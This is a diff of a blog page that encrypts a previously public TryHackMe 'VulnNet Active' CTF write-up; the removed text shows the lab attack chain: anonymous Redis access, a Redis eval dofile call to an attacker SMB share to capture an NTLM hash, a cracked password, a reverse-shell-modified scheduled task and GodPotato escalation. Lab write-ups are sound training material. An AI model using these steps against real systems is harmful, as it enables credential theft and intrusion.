@@ -30,9 +30,10 @@
 <meta property="og:description" content="Exploiting Redis, SMB Shares, and GodPotato for Privilege Escalation">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2025-02-15T11:03:27.000Z">
-<meta property="article:modified_time" content="2026-09-09T02:48:26.495Z">
+<meta property="article:modified_time" content="2026-09-23T06:59:49.200Z">
 <meta property="article:author" content="vkkkv">
 <meta property="article:tag" content="ctf">
+<meta property="article:tag" content="restricted-tryhackme">
 <meta property="article:tag" content="tryhackme">
 <meta property="article:tag" content="writeup">
 <meta name="twitter:card" content="summary">
@@ -205,7 +206,7 @@ p.spoiler {
   
   <aside class="sidebar">
 
-    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+    <div class="sidebar-inner sidebar-overview-active">
       <ul class="sidebar-nav">
         <li class="sidebar-nav-toc">
           Table of Contents
@@ -218,7 +219,6 @@ p.spoiler {
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#vulnnet-active"><span class="nav-number">1.</span> <span class="nav-text">VulnNet Active</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#enumeration"><span class="nav-number">1.1.</span> <span class="nav-text">Enumeration</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#redis-exploration"><span class="nav-number">1.1.1.</span> <span class="nav-text">Redis Exploration</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exploitation"><span class="nav-number">1.2.</span> <span class="nav-text">Exploitation</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#capturing-ntlm-hash"><span class="nav-number">1.2.1.</span> <span class="nav-text">Capturing NTLM Hash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#smb-access"><span class="nav-number">1.2.2.</span> <span class="nav-text">SMB Access</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#privilege-escalation"><span class="nav-number">1.3.</span> <span class="nav-text">Privilege Escalation</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -239,12 +239,12 @@ p.spoiler {
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-count">12</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">370</span>
+        <span class="site-state-item-count">328</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -317,7 +317,7 @@ p.spoiler {
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-09-09 10:48:26" itemprop="dateModified" datetime="2026-09-09T10:48:26+08:00">2026-09-09</time>
+      <time title="Modified: 2026-09-23 14:59:49" itemprop="dateModified" datetime="2026-09-23T14:59:49+08:00">2026-09-23</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -360,33 +360,31 @@ p.spoiler {
     
     
     
-    <div class="post-body" itemprop="articleBody"><h1 id="vulnnet-active">VulnNet Active</h1>
-<p><span class="exturl" data-url="aHR0cHM6Ly90cnloYWNrbWUuY29tL3Jvb20vdnVsbm5ldGFjdGl2ZQ==">vulnnetactive<i class="fa fa-external-link-alt"></i></span></p>
-<h2 id="enumeration">Enumeration</h2>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ rustscan -a 10.10.241.222 -- -Pn</span><br><span class="line">...</span><br><span class="line">Open 10.10.241.222:53</span><br><span class="line">Open 10.10.241.222:135</span><br><span class="line">Open 10.10.241.222:139</span><br><span class="line">Open 10.10.241.222:445</span><br><span class="line">Open 10.10.241.222:464</span><br><span class="line">Open 10.10.241.222:6379</span><br><span class="line">Open 10.10.241.222:9389</span><br></pre></td></tr></table></figure>
-<h3 id="redis-exploration">Redis Exploration</h3>
-<p>Connected to Redis anonymously:</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ redis-cli -h 10.10.241.222 -p 6379</span><br><span class="line">10.10.241.222:6379&gt; info</span><br><span class="line">...</span><br><span class="line">redis_version:2.8.2402</span><br></pre></td></tr></table></figure>
-<h2 id="exploitation">Exploitation</h2>
-<h3 id="capturing-ntlm-hash">Capturing NTLM Hash</h3>
-<p>Used Redis <code>eval</code> to trigger an SMB connection to a local
-listener:</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># On attacker machine</span></span><br><span class="line"><span class="built_in">sudo</span> smbserver.py share ./share/ -smb2support</span><br><span class="line"></span><br><span class="line"><span class="comment"># In Redis CLI</span></span><br><span class="line"><span class="built_in">eval</span> <span class="string">&quot;dofile(&#x27;//10.2.30.143/share&#x27;)&quot;</span> 0</span><br></pre></td></tr></table></figure>
-<p>Captured and cracked the hash for <code>enterprise-security</code>: -
-Password: <code>sand_0873959498</code></p>
-<h3 id="smb-access">SMB Access</h3>
-<p>Accessed <code>Enterprise-Share</code>:</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  tmp smbclient //10.10.85.177/Enterprise-Share --user enterprise-security%sand_0873959498</span><br><span class="line">smb: \&gt; get PurgeIrrelevantData_1826.ps1</span><br></pre></td></tr></table></figure>
-<p>The script is likely a scheduled task. Modified it to include a
-PowerShell reverse shell and uploaded it back.</p>
-<h2 id="privilege-escalation">Privilege Escalation</h2>
-<p>Once a shell was obtained as <code>enterprise-security</code>,
-checked privileges:</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">whoami</span> /priv</span><br><span class="line">...</span><br><span class="line">SeImpersonatePrivilege        Impersonate a client after authentication Enabled</span><br></pre></td></tr></table></figure>
-<p>Used <code>GodPotato</code> to escalate to
-<code>NT AUTHORITY\SYSTEM</code>:</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./godp4.exe -cmd <span class="string">&quot;cmd /c type C:\Users\Administrator\Desktop\system.txt&quot;</span></span><br></pre></td></tr></table></figure>
-
+    <div class="post-body" itemprop="articleBody"><div class="hbe hbe-container" id="hexo-blog-encrypt"
+     data-hbe-format="4"
+     data-wpm="Oh, this is an invalid password. Check and try again, please."
+     data-whm="Oh, this is an invalid password. Check and try again, please."
+     data-salt="5ee0c6348d3780a37c6ddeef722d9930e10502102201e6bad4be07cff6cddcb2"
+     data-nonce="c5c4270d9eb3e6bf0b82e954"
+     data-kdf-iterations="600000"
+     data-auto-save="false">
+  <script id="hbeData" type="hbeData">
+    c4e7fbbdb2ba5d9ff525ffb5da44ed611015108e723cc7e7aed149cfb303d5ab96260180b54c2c3e164d54e6782572ce567c98bc43060fbd0cf28d1484f8a2a481db4d227033f71690772a93c48ef29654efa35ee017da7173bd7c2df15e28bc226bbf9afb203ecd3f69be6f8ba4286e568bdf14ec99029aed5eb1f3f77d29255a4bf35b843a33c448f6a0ea8b9381534792b3a2f3408c44b037b81e91e65045835126cf7065ecc02c4f5fcf8737d6fc8479da915594ff618443e40b92c206ff596e24fd0aee3c0409602e1fd451a0c1e5a949de79188487e1287e2709282da0f50ec5463a2faed478f9f81a1d9a2c82c5c1bee256c962059dbdef507eae54dd4d5ab68756943d56596ce20285ea79f9cc75c9f774ced39e694609df22c4dd98e9d7f87a25c33bff577bbfe110c1dd1264b0a2108fb624e8ac4fb1ff96e26267048b77e6a3bbf6195adb02cbd49b576aa13a0e366691f72a7b0ca427261d1d2c3cc2038cc552c2a0346ed9f515a97c56bc0a79b35b7df735d0ef02be94357b6ebf2090d74617621940707b5acdef34d4ea6d323d5d2dcd8e64451ac94c0d368e35dc203c28952976dba73e69d0ad0b808c923be4ddd03369f1dd418a6df7766154218a94a316cc525f30e6a9ab63cab7a9bbc3fa7b947c3aef4ede230b144bdff541185f785797038823df4ae3f73c47cf505ae0feb0f1b7f23c37712b9aaa3de7e283c78fe01b316854a7655b6b7107266e57eeb4be1c28b9515a7232d41eabe4ccba930c22020a401043b647db37825693d57fb074919a50664a04f71ce0378a1f7d1db667971a237e5bb04542405fc41a0d8c6d6e4a7c5b0bb150df5fbcc9037810352286582acc2e7d9ad5d6bbca182b0a4a1294a990a6e732e34dec594dfb582619eaed5d0ee6be6749800752ff48bed133704c21b46c11e38f0e685dd8b307e3e54c9293e094f3604c944bdcbb533757852c13ae3d1c793e067413775648267e2312ef073aec6168f81d08e7a8b892f0113f599a43dbf7825d127b54455561ce14c6a484109e912cfe53bff916479a006b955adbb039e2bf9f38d54f0229f1d78123c6f9908ac28c9d5db4da4c013e55485d2c86749282fbcc299bae99b0bbd3ebe9395a02c96a909515b23c6b408de8d1ef68d69e5616ebc3a0816f619d5ba7ab4cf999165c835e05f7047d6b56412d9b02a4ab43a7d9fec4926abcf090c1316544cd0ad63bf9d2abfde57765caec0f3dcdb179d7ad411fffe2e9934302077c4051757f70b36828b756ff61d43b889dcbcecd455601ec33ba8d461c0bce9ce5e7fc592bb284a500ef9ee47cf14413990473ab0ef68a2d641bcbbd48bf34dafdc23c0238ebf2f98784ed8e7b1fe9c961f766f803ed08370e22677bdcfae09638f984d35d827bac2d0b041d94041162175beec7a833b86f6c17b1f885716382080acd2f933c92f16f36599ccb956815a959f02467f727fd97fb9543e30c38ebf8355ae650ef18fe970f1f072fd2d60a0e89cf2149ce5a615c8e7baf83a3282b693e8c0ef91f8c2fa1ffb6ca936e8160f801ffe074bf714fd8b81253e7973d3dda7dfc953e5d02bb6dc138069cd24729e3002bdfe836d89868177eb52afa67f25442f306864ca3e26abfe16bb83950a13edec5d654cd23c2525b2e93835b12ead12971c85c549a3c7c6c298a68234436f354b68f0d13e5a2f99909a040b63a9dd6bc97d1721364543a65fb8c1c3b8182a830d467908c06119da7171afb86de595bda7f161dbccbc85ff8d7c3ce571aca76a894e8afeed8cbb879d315e5a02c11f270e2131cec288a6e96bf112399077033400b9cbef4068bdc95dd8d1ac3daf8efc75e2e04846f9759387cee6c4b0cdd0a88d51763738da23f48384fd77f1debb36727a703a569783c15974244a4da1a76063e85289c6edcee75b6e2829f42e9db33c34bff77aa489d2d6fbd96f04e7bca7c3b89c7726d5e23986e1d70ea1e436edb74f8497b7b4f536bec54fd8cd2c3a05537d93efbaba91ead5d7da067cd7d88f461d07365c2af5b694732d482a475480d454ae37c2ef32970ed90a8f5956fb8c16fa215fa6bf9fea435d6816296090bda039bf7bf0bd3940621f2affc662118256f4b592aee705cdc3507938cf10fd534cd847fa07bea6c5d942a0f8e5680830a00ea5f7823d32ff7607cfd15b7edc3553522810040c58fd388d7cad3f55c122c0a05ece59cc4428a72699dc1e072fbef0c87745f776eef1897a58645445fd475e2e4c9526076a684a737cc33601c8d7f091c968ec97bac89ad0975ad50258fc955de2a422fd4f76cd636fa5830ae5810733638e62756f7814b356e65f167888322da68832e4d38de65091c9a7add2c438469fd4d96cfc071c09d6791a1d4f976582ed7eb25a5914763a9962c79537e37818e55ae11454fe221bfab13f7d4e3a5a6d47fcfd2b0f143e63bcce5340eff53b69e22b440a842ed93a3d341f7f15967b43c56aeab6c96a30bbd1781ebdd231d138af0ae260e4c3c8ece89c9b57caffb87649dd2dc6ccffabbe67c3239f7ac597c5b1c67d1a6e5d36c04aaa90a02451b464f82cc8e897fd1bdc31a1df9b21c7db7348f3c5553207149802fad3cb844374cb131e95ba1bc5e51731f46881305a90beb709292db076b60a2c58099dfa36e598e3cfb5db69725cdac35a5dc2d6ff1598111ad0ae5a7a418eba9dc04c38c4f511ead5f25f4d0ef1ed6b6d4aa106934b4be9410af359b5c80ebce6d2cf2de18d5dcfa48d10bd5aa70a9d3efec35894677ee81c6d6abb3a447b78e6b3bcd1ce121f5ee6ea0a5c2c0c2f6bcc3894a521ac1e64adc076d5da95eb4f6a3b89a6be6bb22eca911f0ddceca710c49f8113ecde03c00a81b747fb129f84e0e473bad9a2c8d328108ed28e4662852e113e72a888aa10bd905bf8923bb0b45ec91ff748195b4794ec0a9fa1d726df949cd1db9fcdb879c54dc3109d17efd8bf2b659e0435e07883b3371c9dc60e260288fabf26871ba69f9420c672c6c054ec741f9bcb78931e744d9f4e8d0ba30a4207ccd09bc323f1d58df35039c149c1e3feafc1f18b062ffa7e053278ef136beeec8ae6887b6a9e61f2eb844a08075477d4108aff0913082959c0447f065eeab18c4e55217b90b20e6e795b8d2ba9695dd3e84f4afe7d71ef8587de7d41d9e8d7799ab540933caaa1debc165e5207d2cb70ae9327eefa222c4d9031546a3afea9a975d939540f8db7cf2194f3dbd5594b4476b7f52c4d7d611195dea8309970c5839f3430a9d7e632f9f3d08d4583a05df923c1b3261bdea22183fe1e4569337804a7126acbda93819b6fb97bd822d27da0ae35d66e635e516f0c49de0050baa6740c1ad2aa6dace7190869a0c961f4b8cfb1907e01cb22f29dd7980142c6d4ff1a0f74e916802405fa4a0bbf2f66649e36ed3106b989eee53d0f3a1dfd22885e72a354faea72e9cea30bb1b6cd2bf194bad4e1de6ed88d0f62e0b0d1f1c33f6e2c1fda1e4d38b00d77a414b953a7c30db236016ceff65b4b80acfc06d05cc248bd32929b33a801e782ae847f5d68f7dedc654c6b91e1654bdf8d05ef21ed9f9564002e32b3f9f96af20865ca85df7ed7f00153576bb93c0c14b1296209a14b92f569a6540073e91c193c4c1ce60eb91f3c80cdf03e27941452bb0be376b412a3c21a869f4131dbebc009037cc04ee791a23e5893f9c6bb09076347cad818dd5ac9b18f315729bc31520189260a4813c80cd0ac7990658fa6b7c081f5f9c34850540fe8e254adf7b1db30b429f44e950802989c013dc21111ae9cc67b4a895c9ac85e16740f2c65ea0b624c7dcb069c16f329552503aadfc9a5ae64b32fc3b71de1c8997799ce99459748a8e2e4f5e078b43fce328062ac60ac05041124fee305e9d02fd72527091dc1384dfceeb85f4428cbd4c0e36255d99b6e40c590d47f006bfc8f631482453a8c0a9c5513ce7bb55a39d74d7969a5a5b5bf687a6cb7a55e66f39820e28a1a086f737e30a78ebba48353bd23536e7b3eea6713715782c52958e4f368909d7062ce69373d3898abc1af6c4923d2db42b937568661fbf46477513285e23c4c4b18d29e8f0056573e3e1706544d7d6775cc967909c7f0818ccca6ab0a4c8b5af516fbd94ed6b3728cb536f0a5b0883016a2163a67d784afb21b04ebab947a65d1ef996c7f2eac732159198badcff38bb9d7bc0d65771ea0444ebede6583c13139b0eb82631370207576b05c0c1fd69a314b89c5d0e571d69eff265a19fd9011c8c089001a7f79dad8c4e6769e7faf04f9c555cd87257f3c6bcea8626d94bfc4a1c1db388fac84c3fbc837062c4c591f369ab8805d8b9704065d463caf0ff53af59b7562e6d187f0af9322e3c1a88f07f8beecabe1046c36f388ee7325c41ba1c6f991f9f3364271ebf60320bc677fbeb8bdeec069eee1b69bccb7620c8cd2c62cf5bff2cc0fcee8bcac515a9e9439e94454264af3ab830d79d07b2ddbc84fbc0cb00df64baf60c88fce5124382d3cd8ba010b14038e1cb5010fad257296cef6187013e92c2a5a542c68e65f4905a4b3abef5ed37f21e10fd476440dabae6003bddfde1d4b983b12bfbc31a348f00e7a9cd46f4a1430764b232a85b00134ce74e3154333203ddf871e6a4af13e5071e05b29906adc0c226adff9e2814a3fef4c9f90384edbecc50a9f13748fb196ce368927cfe1f8248e46ce6a7a2e59d11d02aa869cdfb4571ea98fc07bded28c3d2db7f1e531ab1f973cb129a47cd3196b4bf36f73ecf599e64081ccb862aba3d509ef6b419f06ff39a2b308e5a080d45d1f5d1e5283eb36f3559dad3243ad02f478d7d0bee5ce78a3ec102f33cfbe662b2daf52afa2d08af7e8e50aca5807af5424a2c617c606ad1cae57ea49c75f8c018a94365880557007a9e1ddd99bf68c7ac245ecd826a91d7bfaaa8b0efe398e4a7528a97f64be950d34c64aa69f3253c8eef4af9b28793ceb02b024e80585c9fe290263baa21e284e078601c73908c3677aa77d79b9e42bcb2663229320bed682cf2574d0bd1739592b5518c1ac26d7e80ab8ded46498a0fecc58f78366d65cdfaea0204db9404c3bf09af414c0bd5dd952b87bb75c0181069acba7afbfa535a10787d45d8115698ff0f10f5a29648a61c1b59f552d27a0ef30277fc04f5f57180315a662646ff97279da23532a93e9b42aff5ca88c37e7254cdb020cde251bb48913b71c55fc873e800816b63bbde3091712ef920fc120800e7af8c4c3c41ffc1493b8cef19a7aaf0ac37eb0a7404556c2013488c27e8b04d554dc61a1730c9d2709304073fd4d0e7baf24c206ae323166ab93f63563e5783da75058f41b5d3fb6b9518b559d53d35f3869f2d11996cb5b059318e7f7c74faae5dfae7373ff209179b7e49ffdfe9019eaf04d7a35f81b59a08284f8d022fa9e25987ddfa1ca6bde3b8f9be005cdb549fcf92f9d0450b55234b254aa1311845117c79aae6b8f366cc8109a311090d4591b56982aca53e3ddcc34ca3c9f725fba0dad034f493696f06a6c5161d5a352c1119f4c169d1f61e074f1dd7375d5b4d54868ca25e122a16b05e4c4e0a4271e105bc67b27de357ab68e78e9477e6c438521ed7a7915c20995b813e4a2894c2f5c62c967171461ab6da5cc422df7273e4cb9966bcdea0c381932b5854f64fffc939391bff5357ba42ddc3ad788417cfdb550ad73670483aab2ee365d47662468a0ef382bfb2e71c199954368486a1c0421bd36998b9a7b4bf3ee334b3a5b44a3068c9f02035cb72f02728911dd9d9cbd19c34e90c988f124d4bdf1a88044fb82dc2d0e2d4d74168e6b0a978fbfb55f9d5866673d7e2b80353835c5d2548b7b6c02efcb0fd1bdfd747cf14b90f2f24bda9632060bfe7d4524ba5c69c8e6fbe25789917c29218a58dd57d76ba16798a3177ed08bc17c81cf3fd11e454e9a2c7d9b7a289b1e5443330327e11c5f6afc16a2b0a9046b979491ea03f250792b0363df97535c29fb3c0374718e4cf
+  </script>
+  <div class="hbe hbe-content">
+    <form id="hbeForm" class="hbe hbe-form" onsubmit="return false">
+      <div class="hbe hbe-input hbe-input-default">
+      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
+      </label>
+    </div>
+      <button class="hbe hbe-button" type="submit">Decrypt</button>
+      <div class="hbe hbe-error" role="alert" aria-live="polite"></div>
+    </form>
+  </div>
+</div>
+<script data-pjax src="/lib/hbe.51dd9f3b98.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">
     </div>
 
     
@@ -431,6 +429,7 @@ checked privileges:</p>
           <div class="post-tags">
               <a href="/tags/ctf/" rel="tag"><i class="fa fa-tag"></i> ctf</a>
               <a href="/tags/writeup/" rel="tag"><i class="fa fa-tag"></i> writeup</a>
+              <a href="/tags/restricted-tryhackme/" rel="tag"><i class="fa fa-tag"></i> restricted-tryhackme</a>
               <a href="/tags/tryhackme/" rel="tag"><i class="fa fa-tag"></i> tryhackme</a>
           </div>
 
